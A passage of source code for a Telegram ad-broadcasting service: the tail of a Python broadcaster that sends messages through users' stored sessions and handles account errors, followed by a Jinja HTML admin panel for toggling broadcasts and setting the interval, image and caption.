                    "chat_id": str(msg_data["chat_id"]),  
                    "message_id": msg_data["message_id"],  
                    "session_string": session_string,  
                    "sent_at": datetime.now()  
                })  

    except UserDeactivated:  
        if users_col is not None:  
            users_col.update_one(  
                {"_id": user["_id"]},   
                {"$set": {"ads_enabled": False, "status": "deactivated"}}  
            )  
        print(f"❌ User {phone} deactivated")  
    except AuthKeyUnregistered:  
        if users_col is not None:  
            users_col.update_one(  
                {"_id": user["_id"]},   
                {"$set": {"ads_enabled": False, "status": "expired"}}  
            )  
        print(f"❌ Session expired for {phone}")  
    except FloodWait as e:  
        print(f"⏳ Flood wait for {phone}: {e.value}s")  
    except PeerIdInvalid as e:  
        print(f"❌ Peer ID invalid for {phone}: {e}")  
    except Exception as e:  
        print(f"❌ Failed to send to {phone}: {e}")

ads_broadcaster = AdsBroadcaster()



templates/admin.html


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Controller | Admin Panel</title>
    <link rel="icon" href="data:,">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-card: #16161f;
            --bg-hover: #1e1e2a;
            --accent-primary: #6366f1;
            --accent-secondary: #8b5cf6;
            --accent-gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --text-muted: #64748b;
            --border-color: rgba(255, 255, 255, 0.08);
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --glass: rgba(255, 255, 255, 0.03);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
        }

        /* Background Animation */
        .bg-gradient {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            overflow: hidden;
        }

        .bg-gradient::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 20% 80%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
            animation: pulse 15s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(-2%, 2%) scale(1.05); }
        }

        /* Layout */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 24px;
        }

        /* Header */
        .header {
            margin-bottom: 48px;
            padding-bottom: 32px;
            border-bottom: 1px solid var(--border-color);
        }

        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .logo {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 28px;
            font-weight: 700;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: var(--glass);
            border: 1px solid var(--border-color);
            border-radius: 100px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-secondary);
        }

        .status-badge.online::before {
            content: '';
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            box-shadow: 0 0 8px var(--success);
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 15px;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 20px;
            margin-bottom: 48px;
        }

        .stat-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 24px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--accent-gradient);
            transform: scaleX(0);
            transition: transform 0.3s ease;
        }

        .stat-card:hover {
            background: var(--bg-hover);
            transform: translateY(-2px);
        }

        .stat-card:hover::before {
            transform: scaleX(1);
        }

        .stat-label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 600;
        }

        .stat-value {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 32px;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .stat-change {
            font-size: 13px;
            color: var(--text-muted);
        }

        .stat-change.positive {
            color: var(--success);
        }

        /* Main Grid */
        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
            margin-bottom: 32px;
        }

        @media (max-width: 968px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }

        /* Cards */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            overflow: hidden;
        }

        .card-header {
            padding: 24px 24px 0;
            margin-bottom: 8px;
        }

        .card-title {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .card-subtitle {
            font-size: 13px;
            color: var(--text-muted);
        }

        .card-body {
            padding: 24px;
        }

        /* Control Panel */
        .control-grid {
            display: grid;
            gap: 16px;
        }

        .control-btn {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 20px;
            background: var(--glass);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: left;
            width: 100%;
            color: var(--text-primary);
        }

        .control-btn:hover {
            background: var(--bg-hover);
            border-color: var(--accent-primary);
            transform: translateX(4px);
        }

        .control-btn.active {
            background: rgba(99, 102, 241, 0.1);
            border-color: var(--accent-primary);
        }

        .control-btn.danger:hover {
            border-color: var(--danger);
        }

        .control-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: var(--bg-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: all 0.3s ease;
        }

        .control-btn:hover .control-icon {
            background: var(--accent-primary);
        }

        .control-btn.danger:hover .control-icon {
            background: var(--danger);
        }

        .control-icon svg {
            width: 24px;
            height: 24px;
            stroke: var(--text-secondary);
            transition: all 0.3s ease;
        }

        .control-btn:hover .control-icon svg {
            stroke: var(--text-primary);
        }

        .control-content {
            flex: 1;
        }

        .control-title {
            font-weight: 600;
            font-size: 15px;
            margin-bottom: 2px;
        }

        .control-desc {
            font-size: 13px;
            color: var(--text-muted);
        }

        .control-arrow {
            color: var(--text-muted);
            transition: all 0.3s ease;
        }

        .control-btn:hover .control-arrow {
            color: var(--accent-primary);
            transform: translateX(4px);
        }

        /* Quick Stats */
        .quick-stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
        }

        .quick-stat {
            padding: 20px;
            background: var(--glass);
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }

        .quick-stat-value {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 24px;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .quick-stat-label {
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 24px;
            width: 100%;
            max-width: 520px;
            max-height: 90vh;
            overflow: hidden;
            animation: modalSlide 0.3s ease;
        }

        @keyframes modalSlide {
            from {
                opacity: 0;
                transform: translateY(20px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .modal-header {
            padding: 24px 24px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .modal-title {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 20px;
            font-weight: 600;
        }

        .modal-close {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            border: 1px solid var(--border-color);
            background: transparent;
            color: var(--text-muted);
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .modal-close:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }

        .modal-body {
            padding: 24px;
            overflow-y: auto;
            max-height: 60vh;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        .form-input,
        .form-textarea {
            width: 100%;
            padding: 14px 16px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 14px;
            font-family: inherit;
            transition: all 0.2s;
        }

        .form-input:focus,
        .form-textarea:focus {
            outline: none;
            border-color: var(--accent-primary);
            background: var(--bg-card);
        }

        .form-textarea {
            min-height: 120px;
            resize: vertical;
            line-height: 1.6;
        }

        /* Interval Selector */
        .interval-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
        }

        .interval-option {
            padding: 16px;
            background: var(--bg-secondary);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .interval-option:hover {
            border-color: var(--accent-primary);
            background: var(--bg-hover);
        }

        .interval-option.active {
            background: rgba(99, 102, 241, 0.1);
            border-color: var(--accent-primary);
        }

        .interval-value {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 24px;
            font-weight: 700;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .interval-unit {
            font-size: 12px;
            color: var(--text-muted);
            text-transform: uppercase;
        }

        /* File Upload */
        .file-upload {
            border: 2px dashed var(--border-color);
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: var(--glass);
        }

        .file-upload:hover {
            border-color: var(--accent-primary);
            background: rgba(99, 102, 241, 0.05);
        }

        .file-upload input {
            display: none;
        }

        .upload-icon {
            width: 56px;
            height: 56px;
            margin: 0 auto 16px;
            background: var(--bg-secondary);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .upload-icon svg {
            width: 24px;
            height: 24px;
            stroke: var(--accent-primary);
        }

        .upload-text {
            font-weight: 500;
            margin-bottom: 4px;
        }

        .upload-hint {
            font-size: 13px;
            color: var(--text-muted);
        }

        /* Preview */
        .preview-box {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .preview-image {
            width: 100%;
            border-radius: 12px;
            margin-bottom: 16px;
        }

        .preview-caption {
            padding: 16px;
            background: var(--bg-card);
            border-radius: 10px;
            font-size: 14px;
            line-height: 1.6;
            color: var(--text-secondary);
            white-space: pre-wrap;
        }

        .preview-meta {
            display: flex;
            gap: 16px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid var(--border-color);
        }

        .preview-meta-item {
            font-size: 12px;
            color: var(--text-muted);
        }

        .preview-meta-item span {
            color: var(--text-primary);
            font-weight: 600;
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 14px 24px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            border: none;
            width: 100%;
        }

        .btn-primary {
            background: var(--accent-gradient);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(99, 102, 241, 0.4);
        }

        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }

        .btn-secondary:hover {
            background: var(--bg-hover);
        }

        .btn-danger {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.2);
        }

        .btn-group {
            display: flex;
            gap: 12px;
        }

        .btn-group .btn {
            flex: 1;
        }

        /* Toast */
        .toast-container {
            position: fixed;
            bottom: 24px;
            right: 24px;
            z-index: 2000;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .toast {
            padding: 16px 20px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: toastSlide 0.3s ease;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        @keyframes toastSlide {
            from {
                opacity: 0;
                transform: translateX(100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .toast.success {
            border-color: var(--success);
            background: rgba(16, 185, 129, 0.1);
        }

        .toast.error {
            border-color: var(--danger);
            background: rgba(239, 68, 68, 0.1);
        }

        .toast-icon {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
        }

        /* Toggle Switch */
        .toggle-wrapper {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px;
            background: var(--glass);
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }

        .toggle-info h4 {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .toggle-info p {
            font-size: 13px;
            color: var(--text-muted);
        }

        .toggle-switch {
            position: relative;
            width: 52px;
            height: 28px;
            background: var(--bg-secondary);
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid var(--border-color);
        }

        .toggle-switch.active {
            background: var(--accent-primary);
            border-color: var(--accent-primary);
        }

        .toggle-switch::after {
            content: '';
            position: absolute;
            top: 3px;
            left: 3px;
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            transition: all 0.3s;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }

        .toggle-switch.active::after {
            left: 27px;
        }

        /* Empty State */
        .empty-state {
            text-align: center;
            padding: 48px 24px;
            color: var(--text-muted);
        }

        .empty-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 16px;
            background: var(--bg-secondary);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .empty-icon svg {
            width: 28px;
            height: 28px;
            stroke: var(--text-muted);
        }

        .empty-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        .empty-text {
            font-size: 14px;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }
    </style>
</head>
<body>
    <div class="bg-gradient"></div>

    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="header-top">
                <h1 class="logo">BOT CONTROLLER</h1>
                <span class="status-badge online">System Online</span>
            </div>
            <p class="subtitle">Manage broadcast settings, monitor activity, and control bot operations</p>
        </header>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Total Users</div>
                <div class="stat-value" id="statTotal">{{ stats.total_users }}</div>
                <div class="stat-change">Registered accounts</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Active Now</div>
                <div class="stat-value" id="statActive">{{ stats.active_users }}</div>
                <div class="stat-change positive">+{{ stats.recent_users }} this week</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Messages Sent</div>
                <div class="stat-value" id="statMessages">{{ stats.total_ads_sent }}</div>
                <div class="stat-change">Total broadcasts</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Broadcast Status</div>
                <div class="stat-value" id="statBroadcast" style="font-size: 24px; margin-top: 4px;">
                    {{ 'ACTIVE' if config.ads_enabled else 'PAUSED' }}
                </div>
                <div class="stat-change" id="statInterval">{{ config.interval // 60 }}min interval</div>
            </div>
        </div>

        <!-- Main Grid -->
        <div class="main-grid">
            <!-- Control Panel -->
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">Control Panel</h2>
                    <p class="card-subtitle">Manage bot operations and settings</p>
                </div>
                <div class="card-body">
                    <div class="control-grid">
                        <!-- Toggle Ads -->
                        <div class="toggle-wrapper" onclick="toggleAds()" style="cursor: pointer;">
                            <div class="toggle-info">
                                <h4>Broadcast Service</h4>
                                <p id="toggleStatus">{{ 'Running' if config.ads_enabled else 'Stopped' }}</p>
                            </div>
                            <div class="toggle-switch {{ 'active' if config.ads_enabled else '' }}" id="toggleSwitch"></div>
                        </div>

                        <!-- Settings Buttons -->
                        <button class="control-btn" onclick="openModal('intervalModal')">
                            <div class="control-icon">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="12" cy="12" r="10"/>
                                    <path d="M12 6v6l4 2"/>
                                </svg>
                            </div>
                            <div class="control-content">
                                <div class="control-title">Set Interval</div>
                                <div class="control-desc">Configure broadcast timing</div>
                            </div>
                            <svg class="control-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M9 18l6-6-6-6"/>
                            </svg>
                        </button>

                        <button class="control-btn" onclick="openModal('photoModal')">
                            <div class="control-icon">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="3" width="18" height="18" rx="2"/>
                                    <circle cx="8.5" cy="8.5" r="1.5"/>
                                    <path d="M21 15l-5-5L5 21"/>
                                </svg>
                            </div>
                            <div class="control-content">
                                <div class="control-title">Upload Media</div>
                                <div class="control-desc">Set broadcast image</div>
                            </div>
                            <svg class="control-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M9 18l6-6-6-6"/>
                            </svg>
                        </button>

                        <button class="control-btn" onclick="openModal('captionModal')">
                            <div class="control-icon">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"/>
                                    <path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"/>
                                </svg>
                            </div>
                            <div class="control-content">
                                <div class="control-title">Edit Caption</div>
                                <div class="control-desc">Modify message text</div>
                            </div>
                            <svg class="control-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M9 18l6-6-6-6"/>
                            </svg>
                        </button>

                        <button class="control-btn" onclick="openModal('previewModal')">
                            <div class="control-icon">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                    <circle cx="12" cy="12" r="3"/>
                                </svg>
                            </div>
                            <div class="control-content">
                                <div class="control-title">Preview</div>
                                <div class="control-desc">View broadcast appearance</div>
                            </div>
                            <svg class="control-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M9 18l6-6-6-6"/>
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <!-- Quick Stats -->
            <div class="card">
                <div class="card-header">
                    <h2 class="card-title">Live Activity</h2>
                    <p class="card-subtitle">Real-time system metrics</p>
                </div>
                <div class="card-body">
                    <div class="quick-stats">
                        <div class="quick-stat">
                            <div class="quick-stat-value" id="quickSessions">{{ stats.active_sessions or 0 }}</div>
                            <div class="quick-stat-label">Active Sessions</div>
                        </div>
                        <div class="quick-stat">
                            <div class="quick-stat-value" id="quickPending">{{ stats.pending_msgs or 0 }}</div>
                            <div class="quick-stat-label">Pending Msgs</div>
                        </div>
                        <div class="quick-stat">
                            <div class="quick-stat-value" id="quickOnline">{{ stats.online_users or 0 }}</div>
                            <div class="quick-stat-label">Online Now</div>
                        </div>
                        <div class="quick-stat">
                            <div class="quick-stat-value" id="quickIdle">{{ stats.idle_users or 0 }}</div>
                            <div class="quick-stat-label">Idle Users</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Interval Modal -->
    <div class="modal-overlay" id="intervalModal" onclick="closeModalOnOverlay(event, 'intervalModal')">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Set Interval</h3>
                <button class="modal-close" onclick="closeModal('intervalModal')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M18 6L6 18M6 6l12 12"/>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <p style="color: var(--text-muted); margin-bottom: 20px; font-size: 14px;">Select time between broadcast rounds. Previous messages will be deleted before new round starts.</p>

                <div class="interval-grid">
                    <div class="interval-option {{ 'active' if config.interval == 600 else '' }}" onclick="setBroadcastInterval(10, this)">
                        <div class="interval-value">10</div>
                        <div class="interval-unit">Minutes</div>
                    </div>
                    <div class="interval-option {{ 'active' if config.interval == 1200 else '' }}" onclick="setBroadcastInterval(20, this)">
                        <div class="interval-value">20</div>
                        <div class="interval-unit">Minutes</div>
                    </div>
                    <div class="interval-option {{ 'active' if config.interval == 1800 else '' }}" onclick="setBroadcastInterval(30, this)">
                        <div class="interval-value">30</div>
                        <div class="interval-unit">Minutes</div>
                    </div>
                    <div class="interval-option {{ 'active' if config.interval == 3600 else '' }}" onclick="setBroadcastInterval(60, this)">
                        <div class="interval-value">1</div>
                        <div class="interval-unit">Hour</div>
                    </div>
                    <div class="interval-option {{ 'active' if config.interval == 7200 else '' }}" onclick="setBroadcastInterval(120, this)">
                        <div class="interval-value">2</div>
                        <div class="interval-unit">Hours</div>
                    </div>
                    <div class="interval-option {{ 'active' if config.interval == 14400 else '' }}" onclick="setBroadcastInterval(240, this)">
                        <div class="interval-value">4</div>
                        <div class="interval-unit">Hours</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Photo Modal -->
    <div class="modal-overlay" id="photoModal" onclick="closeModalOnOverlay(event, 'photoModal')">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Upload Media</h3>
                <button class="modal-close" onclick="closeModal('photoModal')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M18 6L6 18M6 6l12 12"/>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <div class="file-upload" onclick="document.getElementById('photoInput').click()">
                    <div class="upload-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                            <polyline points="17 8 12 3 7 8"/>
                            <line x1="12" y1="3" x2="12" y2="15"/>
                        </svg>
                    </div>
                    <div class="upload-text">Click to upload image</div>
                    <div class="upload-hint">JPG, PNG, WEBP up to 16MB</div>
                    <input type="file" id="photoInput" accept="image/*" onchange="uploadPhoto(this)">
                </div>

                <div id="uploadPreview" style="display: none; margin-top: 20px;">
                    <img id="previewImage" class="preview-image" style="display: none;">
                </div>
            </div>
        </div>
    </div>

    <!-- Caption Modal -->
    <div class="modal-overlay" id="captionModal" onclick="closeModalOnOverlay(event, 'captionModal')">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Edit Caption</h3>
                <button class="modal-close" onclick="closeModal('captionModal')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M18 6L6 18M6 6l12 12"/>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Broadcast Message</label>
                    <textarea class="form-textarea" id="captionText" placeholder="Enter your broadcast message...">{{ config.caption }}</textarea>
                </div>
                <button class="btn btn-primary" onclick="saveCaption()">Save Changes</button>
            </div>
        </div>
    </div>

    <!-- Preview Modal -->
    <div class="modal-overlay" id="previewModal" onclick="closeModalOnOverlay(event, 'previewModal')">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Broadcast Preview</h3>
                <button class="modal-close" onclick="closeModal('previewModal')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M18 6L6 18M6 6l12 12"/>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <div id="previewContainer">
                    <div class="empty-state">
                        <div class="empty-icon">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <rect x="3" y="3" width="18" height="18" rx="2"/>
                                <circle cx="8.5" cy="8.5" r="1.5"/>
                                <path d="M21 15l-5-5L5 21"/>
                            </svg>
                        </div>
                        <div class="empty-title">No Content Set</div>
                        <div class="empty-text">Upload media and add caption to see preview</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Toast Container -->
    <div class="toast-container" id="toastContainer"></div>

    <script>
        // Base path for all API calls. The admin blueprint is mounted at /admin,
        // and this page is served from /admin/, so relative paths resolve correctly.
        const API_BASE = 'api';

        // Modal Functions
        function openModal(id) {
            document.getElementById(id).classList.add('active');
            if (id === 'previewModal') loadPreview();
        }

        function closeModal(id) {
            document.getElementById(id).classList.remove('active');
        }

        function closeModalOnOverlay(event, id) {
            if (event.target.id === id) closeModal(id);
        }

        // Toast Function
        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;

            const icon = type === 'success' 
                ? '<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>'
                : '<svg class="toast-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';

            toast.innerHTML = icon + message;
            container.appendChild(toast);

            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transform = 'translateX(100%)';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }

        // Toggle Ads
        async function toggleAds() {
            try {
                const response = await fetch(`${API_BASE}/toggle-ads`, { method: 'POST' });
                const data = await response.json();

                if (data.success) {
                    const switchEl = document.getElementById('toggleSwitch');
                    const statusEl = document.getElementById('toggleStatus');
                    const statBroadcast = document.getElementById('statBroadcast');

                    if (data.enabled) {
                        switchEl.classList.add('active');
                        statusEl.textContent = 'Running';
                        statBroadcast.textContent = 'ACTIVE';
                        showToast('Broadcast service started');
                    } else {
                        switchEl.classList.remove('active');
                        statusEl.textContent = 'Stopped';
                        statBroadcast.textContent = 'PAUSED';
                        showToast('Broadcast service stopped');
                    }
                } else {
                    showToast(data.error || 'Toggle failed', 'error');
                }
            } catch (e) {
                showToast('Failed to toggle service', 'error');
            }
        }

        // Set Interval (renamed from setInterval so it no longer shadows the global timer)
        async function setBroadcastInterval(minutes, el) {
            try {
                const response = await fetch(`${API_BASE}/set-interval`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({interval: minutes})
                });
                const data = await response.json();

                if (data.success) {
                    document.querySelectorAll('.interval-option').forEach(x => x.classList.remove('active'));
                    if (el) el.classList.add('active');
                    document.getElementById('statInterval').textContent = minutes + 'min interval';
                    showToast(`Interval set to ${minutes} minutes`);
                    setTimeout(() => closeModal('intervalModal'), 500);
                } else {
                    showToast(data.error || 'Failed to set interval', 'error');
                }
            } catch (e) {
                showToast('Failed to set interval', 'error');
            }
        }

        // Upload Photo
        async function uploadPhoto(input) {
            if (!input.files || !input.files[0]) return;

            const file = input.files[0];
            const formData = new FormData();
            formData.append('photo', file);

            // Show preview
            const reader = new FileReader();
            reader.onload = function(e) {
                const preview = document.getElementById('previewImage');
                preview.src = e.target.result;
                preview.style.display = 'block';
                document.getElementById('uploadPreview').style.display = 'block';
            };
            reader.readAsDataURL(file);

            try {
                const response = await fetch(`${API_BASE}/upload-photo`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (data.success) {
                    showToast('Media uploaded successfully');
                } else {
                    showToast(data.error || 'Upload failed', 'error');
                }
            } catch (e) {
                showToast('Upload failed', 'error');
            }
        }

        // Save Caption
        async function saveCaption() {
            const caption = document.getElementById('captionText').value;

            try {
                const response = await fetch(`${API_BASE}/set-caption`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({caption: caption})
                });
                const data = await response.json();

                if (data.success) {
                    showToast('Caption saved');
                    closeModal('captionModal');
                } else {
                    showToast(data.error || 'Failed to save caption', 'error');
                }
            } catch (e) {
                showToast('Failed to save caption', 'error');
            }
        }

        // Extract just the filename from a stored path (handles / and \ separators)
        function baseName(path) {
            if (!path) return null;
            return path.split(/[\\/]/).pop();
        }

        // Load Preview
        async function loadPreview() {
            try {
                const response = await fetch(`${API_BASE}/preview`);
                const data = await response.json();
                const container = document.getElementById('previewContainer');

                // Prefer an explicit filename from the server, fall back to basename of the path
                const photoFile = data.photo_file || baseName(data.photo_path);

                if (!photoFile && !data.caption) {
                    container.innerHTML = `
                        <div class="empty-state">
                            <div class="empty-icon">
